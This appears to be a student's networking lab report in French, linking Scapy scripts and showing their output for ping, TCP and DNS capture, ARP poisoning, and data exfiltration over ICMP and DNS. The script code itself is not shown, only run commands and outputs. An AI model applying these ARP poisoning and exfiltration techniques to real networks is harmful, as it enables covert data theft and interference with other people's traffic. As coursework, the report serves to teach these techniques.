# I. Getting started Scapy

🌞 **`ping.py`**

[ping.py](./ping.py)

```
PS C:\Users\guill\TP-Reseau-B2\4> python3.12.exe .\ping.py
Begin emission:
Finished sending 1 packets.
.*
Received 2 packets, got 1 answers, remaining 0 packets
Pong reçu : QueryAnswer(query=<Ether  dst=c0:e4:34:a8:f2:d5 src=14:13:33:86:6a:1b type=IPv4 |<IP  frag=0 proto=icmp src=10.33.76.184 dst=10.33.74.56 |<ICMP  type=echo-request |>>>, answer=<Ether  dst=14:13:33:86:6a:1b src=c0:e4:34:a8:f2:d5 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=28 id=4956 flags= frag=0 ttl=128 proto=icmp chksum=0x7c53 src=10.33.74.56 dst=10.33.76.184 |<ICMP  type=echo-reply code=0 chksum=0xffff id=0x0 seq=0x0 |<Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |>>>>)
```

🌞 **`tcp_cap.py`**

[TCP capture](./4/tcp_cap.py)

```
PS C:\Users\guill\TP-Reseau-B2> & C:/Users/guill/AppData/Local/Microsoft/WindowsApps/python3.12.exe c:/Users/guill/TP-Reseau-B2/4/tcp_cap.py
TCP SYN ACK reçu !
- Adresse IP src :13.89.179.9
- Adresse IP dst : 192.168.1.28
- Port TCP src : 443
- Port TCP dst : 51041
```



🌞 **`dns_cap.py`**

[dns_cap](./4/dns_cap.py)

```
PS C:\Users\guill\TP-Reseau-B2> python .\4\dns_cap.py      
DNS reçu : 172.67.74.226
```


🌞 **`dns_lookup.py`**

[DNS lookup](./4/dns_lookup.py)

```
PS C:\Users\guill\TP-Reseau-B2\4> python3.12.exe .\dns_lookup.py nathan.bonnell.fr
Begin emission:
Finished sending 1 packets.
....*
Received 5 packets, got 1 answers, remaining 0 packets
DNS reçu ! Adresse IP : 213.186.33.87
```

# II. ARP Poisoning

BON VOUS ALLEZ PAS Y COUPER SI VOUS L'AVEZ JAMAIS FAIT.

**P'tit détour rapide sur un ARP Poisoning simple.** Pas question de MITM ici, juste injecter une fausse donnée dans la table ARP de quelqu'un.

🌞 **`arp_poisoning.py`**

[ARP_poisoning](/4/arp_poisoning.py)


# II. Exfiltration ICMP


🌞 **`icmp_exf_send.py`**

[icmp_send](/4/icmp_exf_send.py)

```
PS C:\Users\guill\TP-Reseau-B2\4> python .\icmp_exf_send.py 10.33.67.166 toto
.
Sent 1 packets.
```

🌞 **`icmp_exf_receive.py`**


[icmp_receive](/4/icmp_exf_receive.py)

```
PS C:\Users\guill\TP-Reseau-B2\4> python .\icmp_exf_receive.py 
ICMP reçu ! MESSAGE : toto
```

# III. Exfiltration DNS

🌞 **`dns_exfiltration_send.py`**

[dns_exfiltration](/4/dns_exfiltration_send.py)

```
PS C:\Users\guill\TP-Reseau-B2\4> python .\dns_exfiltration_send.py 192.168.56.15 pouet!             
Envoi du paquet DNS...
.
Sent 1 packets.
Paquet envoyé !
```

⭐ **Bonus 3 mid : `dns_exfiltration_receive.py`**


[dns_receive](/4/dns_exfiltration_receive.py)

```
PS C:\Users\guill\TP-Reseau-B2\4> python .\dns_exfiltration_receive.py  
DNS reçu : quentin
DNS reçu : t
DNS reçu : moche
```